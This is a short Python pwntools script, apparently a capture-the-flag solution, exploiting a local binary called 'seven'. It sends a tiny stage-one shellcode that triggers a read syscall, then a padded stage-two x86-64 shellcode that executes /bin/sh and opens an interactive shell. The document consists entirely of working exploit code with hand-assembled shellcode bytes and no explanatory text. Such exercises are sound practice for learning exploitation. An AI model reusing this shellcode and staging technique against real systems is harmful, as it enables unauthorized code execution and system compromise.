from pwn import *

context.log_level = 'debug'
p=process('./seven')
#p=process('./six')
p.readuntil('shellcode:')
payload=chr(0x54)+chr(0x5e)+chr(0x8b)+chr(0xd6)+chr(0x0F)+chr(0x05)

#gdb.attach(p)
p.writeline(payload)
z=[
0xB8, 0x3B, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xFE, 0x48, 0x81, 0xC7, 0x4e, 0x0B, 0x00, 0x00, 0x4b, 0x48,0x33, 0xD2, 0x48,
0x33, 0xF6, 0x0F, 0x05, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00]
zz=''
for i in range(0,len(z)):
    zz+=chr(z[i])
payload='b'*0xb36+zz
#raw_input()
p.writeline(payload)
p.interactive()
